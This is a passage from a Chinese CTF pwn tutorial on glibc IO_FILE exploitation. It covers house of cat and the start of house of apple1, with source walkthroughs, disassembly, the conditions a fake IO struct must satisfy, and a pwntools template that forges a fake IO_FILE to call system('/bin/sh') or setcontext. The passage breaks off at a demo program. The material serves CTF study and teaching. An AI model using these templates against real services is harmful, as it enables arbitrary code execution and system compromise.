mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">off64_t</span> result;</span><br><span class="line">  <span class="type">off64_t</span> delta, new_offset;</span><br><span class="line">  <span class="type">long</span> <span class="type">int</span> count;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (mode == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> do_ftell_wide (fp);</span><br><span class="line">  <span class="type">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base</span><br><span class="line">            == fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">               &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base</span><br><span class="line">               == fp-&gt;_wide_data-&gt;_IO_write_ptr));</span><br><span class="line">#需要绕过was_writing的检测</span><br><span class="line">  <span class="type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">               &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">              || _IO_in_put_mode (fp));</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中fp结构体是我们可以伪造的，可以控制fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base来调用_IO_switch_to_wget_mode这个函数，继续跟进代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><u>而_IO_WOVERFLOW是glibc里定义的一个宏调用函数</u></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br></pre></td></tr></table></figure><p><strong><u>对_IO_WOVERFLOW没有进行任何检测</u></strong>，为了便于理解，我们再来看看汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">► 0x7f4cae745d30 &lt;_IO_switch_to_wget_mode&gt;       endbr64</span><br><span class="line">  0x7f4cae745d34 &lt;_IO_switch_to_wget_mode+4&gt;     mov    rax, qword ptr [rdi + 0xa0]</span><br><span class="line">  0x7f4cae745d3b &lt;_IO_switch_to_wget_mode+11&gt;    push   rbx</span><br><span class="line">  0x7f4cae745d3c &lt;_IO_switch_to_wget_mode+12&gt;    mov    rbx, rdi</span><br><span class="line">  0x7f4cae745d3f &lt;_IO_switch_to_wget_mode+15&gt;    mov    rdx, qword ptr [rax + 0x20]</span><br><span class="line">  0x7f4cae745d43 &lt;_IO_switch_to_wget_mode+19&gt;    cmp    rdx, qword ptr [rax + 0x18]</span><br><span class="line">  0x7f4cae745d47 &lt;_IO_switch_to_wget_mode+23&gt;    jbe    _IO_switch_to_wget_mode+56                &lt;_IO_switch_to_wget_mode+56&gt;</span><br><span class="line"> </span><br><span class="line">  0x7f4cae745d49 &lt;_IO_switch_to_wget_mode+25&gt;    mov    rax, qword ptr [rax + 0xe0]</span><br><span class="line">  0x7f4cae745d50 &lt;_IO_switch_to_wget_mode+32&gt;    mov    esi, 0xffffffff</span><br><span class="line">  0x7f4cae745d55 &lt;_IO_switch_to_wget_mode+37&gt;    call   qword ptr [rax + 0x18]</span><br></pre></td></tr></table></figure><p>主要关注这几句，做了一下几点事情</p><ol><li><p>将[rdi+0xa0]处的内容赋值给rax，为了避免与下面的rax混淆，称之为<strong>rax1</strong>。</p></li><li><p>将新赋值的[rax1+0x20]处的内容赋值给rdx。</p></li><li>将[rax1+0xe0]处的内容赋值给rax，称之为<strong>rax2</strong>。</li><li>call调用[rax2+0x18]处的内容。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x7f4cae745d34&lt;_IO_switch_to_wget_mode+4&gt;   mov  rax, qword ptr [rdi+0xa0]</span><br><span class="line">0x7f4cae745d3f&lt;_IO_switch_to_wget_mode+15&gt;  mov  rdx, qword ptr [rax+0x20]</span><br><span class="line">0x7f4cae745d49&lt;_IO_switch_to_wget_mode+25&gt;  mov  rax, qword ptr [rax+0xe0]</span><br><span class="line">0x7f4cae745d55&lt;_IO_switch_to_wget_mode+37&gt;  call  qword ptr [rax+0x18]</span><br></pre></td></tr></table></figure><p>而rdi此时的状态:</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/959842_STBECKY3R8W9W2A.png" alt=""></p><p>可以看到这是一个堆地址，而实际上此时rdi就是伪造的IO结构体的地址，也是可控的。</p><p>在造成任意地址写一个堆地址的基础上，这里的寄存器rdi（fake_IO的地址）、rax和rdx都是我们可以控制的，</p><ul><li>在<strong>开启沙箱</strong>的情况下，假如把最后调用的<strong>[rax + 0x18]设置为setcontext，把rdx设置为可控的堆地址，就能执行srop来读取flag</strong>；</li><li>如果<strong>未开启沙箱</strong>，则只需把<strong>最后调用的[rax + 0x18]设置为system函数，把fake_IO的头部写入/bin/sh字符串</strong>，就可执行system(“/bin/sh”)</li></ul><h3 id="fake-IO结构体需要绕过的检测"><a href="#fake-IO结构体需要绕过的检测" class="headerlink" title="fake_IO结构体需要绕过的检测"></a>fake_IO结构体需要绕过的检测</h3><p>完全按照流程走下来需要满足的条件是</p><ol><li><p>fp-&gt;_lock是一个可写地址_</p></li><li><p>_(fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</p><p>   || (_IO_vtable_offset (fp) == 0</p><p>​     &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</p><p>​      > fp-&gt;_wide_data-&gt;_IO_write_base))</p></li><li><p>fp-&gt;_mode!=0</p></li><li><p>fp-&gt;_wide_data-&gt;_IO_write_ptr> fp-&gt;_wide_data-&gt;_IO_write_base或者_IO_CURRENTLY_PUTTING标志为1</p></li><li><p>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</p></li></ol><p>整理一下可以缩减为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mode&gt;<span class="number">0</span></span><br><span class="line">_wide_data-&gt;_IO_read_ptr != _wide_data-&gt;_IO_read_end<span class="comment">//这个条件不知道是在哪里要求的,我跟着流程似乎并没有找到这个条件</span></span><br><span class="line">_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</span><br><span class="line">#如果_wide_data=fake_io_addr+<span class="number">0x30</span>，其实也就是fp-&gt;_IO_save_base &lt; f-&gt;_IO_backup_base</span><br><span class="line">fp-&gt;_lock是一个可写地址（堆地址、libc中的可写地址）</span><br></pre></td></tr></table></figure><h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><p>1.修改<strong>_IO_list_all</strong>为可控地址（<strong>FSOP</strong>）或修改<strong>stderr</strong>为可控地址(<strong>__malloc_assert</strong>)。<br>2.在上一步的可控地址中伪造<strong>fake_IO结构体</strong>(也可以在任意地址写的情况下修改<strong>stderr、stdout</strong>等结构体)。<br>3.通过<strong>FSOP</strong>或<strong>malloc</strong>触发攻击。<br><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/959842_JDJKTRK7GJUEUFR.png" alt=""></p><h3 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h3><p>house of cat的模板，原理参照上图。伪造IO结构体时只需修改<strong>fake_io_addr</strong>地址，<strong>_IO_save_end</strong>为想要调用的函数，<strong>_IO_backup_base</strong>为执行函数时的rdx，以及修改_flags为执行函数时的rdi;FSOP和利用__malloc_assert触发house of cat的情况不同，</p><p>需要具体问题具体调整（FSOP需将vtable改为IO_wfile_jumps+0x30）</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">fake_io_addr=heapbase+<span class="number">0xb00</span> <span class="comment"># 伪造的fake_IO结构体的地址</span></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE=p64(rdi)         <span class="comment">#_flags=rdi</span></span><br><span class="line">fake_IO_FILE+=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">1</span>)+p64(<span class="number">2</span>) <span class="comment"># rcx!=0(FSOP)</span></span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0xb0</span>)<span class="comment">#_IO_backup_base=rdx</span></span><br><span class="line">fake_IO_FILE +=p64(call_addr)<span class="comment">#_IO_save_end=call addr(call setcontext/system)</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x68</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x88</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heapbase+<span class="number">0x1000</span>)  <span class="comment"># _lock = a writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xa0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0x30</span>)<span class="comment">#_wide_data,rax1_addr</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) <span class="comment">#mode=1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xd8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libcbase+<span class="number">0x2160c0</span>+<span class="number">0x10</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>)  <span class="comment"># rax2_addr</span></span><br></pre></td></tr></table></figure><h2 id="例题-6"><a href="#例题-6" class="headerlink" title="例题"></a>例题</h2><p><strong>2022强网-house of cat</strong></p><h1 id="house-of-apple1"><a href="#house-of-apple1" class="headerlink" title="house of apple1"></a>house of apple1</h1><h2 id="概要-14"><a href="#概要-14" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>house of apple1利用largebin attack 修改_IO_list_all,然后主要是利用控制_wide_data字段,以及vtable偏移调用_IO_wstrn_jumps,从而做到修改内存为已知值</p><p><code>house of apple1</code> 的利用链可以在任意地址写堆地址，相当于再一次<code>largebin attack</code>的效果。因此，<code>house of apple1</code> 需要和其他方法结合而进行后续的<code>FSOP</code>利用。</p><p><strong>利用条件:</strong></p><ol><li>程序从<code>main</code>函数返回或能调用<code>exit</code>函数</li><li>能够泄露堆地址和libc基址</li><li>能使用一次<code>largebin attack</code>（一次即可）</li><li>能够触发IO流(FSOP或触发__malloc_assert,或者程序中存在puts等能进入IO链的函数),执行IO相关函数</li></ol><p><strong>利用效果:</strong>任意地址写堆地址—&gt;控制流</p><p><strong>有效版本:</strong>2.36及以前</p><p><strong>失效原因:</strong>2.37开始,不再存在_IO_wstrn_overflow函数,甚至去除了整个_IO_wstrn_jumps</p><h2 id="原理-14"><a href="#原理-14" class="headerlink" title="原理"></a>原理</h2><p><strong>前言:</strong>众所周知，<code>glibc</code>高版本逐渐移除了<code>__malloc_hook/__free_hook/__realloc_hook</code>等等一众<code>hook</code>全局变量，<code>ctf</code>中<code>pwn</code>题对<code>hook</code>钩子的利用将逐渐成为过去式。而想要在高版本利用成功，基本上就离不开对<code>IO_FILE</code>结构体的伪造与<code>IO</code>流的攻击。之前很多师傅都提出了一些优秀的攻击方法，比如house of pig,house of kiwi和 house of emma等。</p><p>其中，<code>house of pig</code>除了需要劫持<code>IO_FILE</code>结构体，还需要劫持<code>tcache_perthread_struct</code>结构体或者能控制任意地址分配；<code>house of kiwi</code>则至少需要修改三个地方的值：<code>_IO_helper_jumps + 0xA0</code>和<code>_IO_helper_jumps + 0xA8</code>，另外还要劫持<code>_IO_file_jumps + 0x60</code>处的<code>_IO_file_sync</code>指针；而<code>house of emma</code>则至少需要修改两个地方的值，一个是<code>tls</code>结构体的<code>point_guard</code>(或者想办法泄露出来)，另外需要<strong>伪造一个<code>IO_FILE</code>或替换<code>vtable</code>为<code>xxx_cookie_jumps</code>的地址。</strong></p><p>总的来看，如果想使用上述方法成功地攻击<code>IO</code>，至少需要两次写或者一次写和一次任意地址读。而在只给一次任意地址写（如一次<code>largebin attack</code>）的情景下是很难利用成功的。</p><p><code>largebin attack</code>是高版本中为数不多的可以任意地址写一个堆地址的方法，并常常和上述三种方法结合起来利用。本文将给出一种新的利用方法，在仅使用一次<code>largebin attack</code>并限制读写次数的条件下进行<code>FSOP</code>利用。顺便说一下，house of banana 也只需要一次<code>largebin attack</code>，但是其攻击的是<code>rtld_global</code>结构体，而不是<code>IO</code>流。</p><hr><p>当程序从<code>main</code>函数返回或者执行<code>exit</code>函数的时候，均会调用<code>fcloseall</code>函数，该调用链为：</p><ul><li>exit<ul><li>fcloseall<ul><li>_IO_cleanup<ul><li>_IO_flush_all_lockp(_IO_flush_all)<ul><li>_IO_OVERFLOW</li></ul></li></ul></li></ul></li></ul></li></ul><p>最后会遍历<code>_IO_list_all</code>存放的每一个<code>IO_FILE</code>结构体，如果满足条件的话，会调用每个结构体中<code>vtable-&gt;_overflow</code>函数指针指向的函数。</p><p>使用<code>largebin attack</code>可以劫持<code>_IO_list_all</code>变量，将其替换为伪造的<code>IO_FILE</code>结构体，而在此时，我们其实仍可以继续利用某些<code>IO</code>流函数去修改其他地方的值。要想修改其他地方的值，就离不开<code>_IO_FILE</code>的一个成员<code>_wide_data</code>的利用</p><p>在伪造<code>_IO_FILE</code>结构体的时候，伪造<code>_wide_data</code>变量，然后通过某些函数，比如<code>_IO_wstrn_overflow</code>就可以将已知地址空间上的某些值修改为一个已知值。</p><p><strong>glibc/libio/vswprintf.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">wint_t</span></span><br><span class="line">_IO_wstrn_overflow (FILE *fp, <span class="type">wint_t</span> c)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  _IO_wstrnfile *snf = (_IO_wstrnfile *) fp;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_wsetb (fp, snf-&gt;overflow_buf,</span><br><span class="line">         snf-&gt;overflow_buf + (<span class="keyword">sizeof</span> (snf-&gt;overflow_buf)</span><br><span class="line">                      / <span class="keyword">sizeof</span> (<span class="type">wchar_t</span>)), <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_base = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_end = (snf-&gt;overflow_buf</span><br><span class="line">                      + (<span class="keyword">sizeof</span> (snf-&gt;overflow_buf)</span><br><span class="line">                     / <span class="keyword">sizeof</span> (<span class="type">wchar_t</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_ptr = snf-&gt;overflow_buf;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_end = snf-&gt;overflow_buf;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_strfile f;</span><br><span class="line">  <span class="comment">/* This is used for the characters which do not fit in the buffer</span></span><br><span class="line"><span class="comment">     provided by the user.  */</span></span><br><span class="line">  <span class="type">wchar_t</span> overflow_buf[<span class="number">64</span>];</span><br><span class="line">&#125; _IO_wstrnfile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_strfile_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span> _<span class="title">sbf</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span> _<span class="title">s</span>;</span></span><br><span class="line">&#125; _IO_strfile;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  FILE _f;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_alloc_type _allocate_buffer_unused;</span><br><span class="line">  _IO_free_type _free_buffer_unused;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>分析一下这个函数，首先将<code>fp</code>强转为<code>_IO_wstrnfile *</code>指针，然后判断<code>fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf</code>是否成立（一般肯定是成立的），如果成立则会对<code>fp-&gt;_wide_data</code>的<code>_IO_write_base</code>、<code>_IO_read_base</code>、<code>_IO_read_ptr</code>和<code>_IO_read_end</code>赋值为<code>snf-&gt;overflow_buf</code>或者与该地址一定范围内偏移的值；最后对<code>fp-&gt;_wide_data</code>的<code>_IO_write_ptr</code>和<code>_IO_write_end</code>赋值。</p><p>也就是说，只要控制了<code>fp-&gt;_wide_data</code>，就可以控制从<code>fp-&gt;_wide_data</code>开始一定范围内的内存的值，也就等同于<strong>任意地址写已知地址</strong>。</p><p>这里有时候需要绕过<code>_IO_wsetb</code>函数里面的<code>free</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wsetb (FILE *f, <span class="type">wchar_t</span> *b, <span class="type">wchar_t</span> *eb, <span class="type">int</span> a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF))</span><br><span class="line">    <span class="built_in">free</span> (f-&gt;_wide_data-&gt;_IO_buf_base); <span class="comment">//使上面两个条件至少有一个不满足</span></span><br><span class="line">  f-&gt;_wide_data-&gt;_IO_buf_base = b;</span><br><span class="line">  f-&gt;_wide_data-&gt;_IO_buf_end = eb;</span><br><span class="line">  <span class="keyword">if</span> (a)</span><br><span class="line">    f-&gt;_flags2 &amp;= ~_IO_FLAGS2_USER_WBUF;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    f-&gt;_flags2 |= _IO_FLAGS2_USER_WBUF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>_IO_wstrnfile</code>涉及到的结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_strfile f;</span><br><span class="line">  <span class="comment">/* This is used for the characters which do not fit in the buffer</span></span><br><span class="line"><span class="comment">     provided by the user.  */</span></span><br><span class="line">  <span class="type">wchar_t</span> overflow_buf[<span class="number">64</span>];</span><br><span class="line">&#125; _IO_wstrnfile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_strfile_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span> _<span class="title">sbf</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span> _<span class="title">s</span>;</span></span><br><span class="line">&#125; _IO_strfile;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  FILE _f;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_alloc_type _allocate_buffer_unused;</span><br><span class="line">  _IO_free_type _free_buffer_unused;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中，<code>overflow_buf</code>相对于<code>_IO_FILE</code>结构体的偏移为<code>0xf0</code>，在<code>vtable</code>后面。</p><p>而<code>struct _IO_wide_data</code>结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;    <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;    <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;    <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;    <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;    <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;    <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;    <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;        <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;    <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;    <span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">                   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;    <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"> </span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> _<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>换而言之，假如此时在堆上伪造一个<code>_IO_FILE</code>结构体并已知其地址为<code>A</code>，将<code>A + 0xd8</code>替换为<code>_IO_wstrn_jumps</code>地址，<code>A + 0xc0</code>设置为<code>B</code>，并设置其他成员以便能调用到<code>_IO_OVERFLOW</code>。<code>exit</code>函数则会一路调用到<code>_IO_wstrn_overflow</code>函数，并将<code>B</code>至<code>B + 0x38</code>的地址区域的内容都替换为<code>A + 0xf0</code>或者<code>A + 0x1f0</code>。</p><p>一个<code>demo</code>程序验证：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span 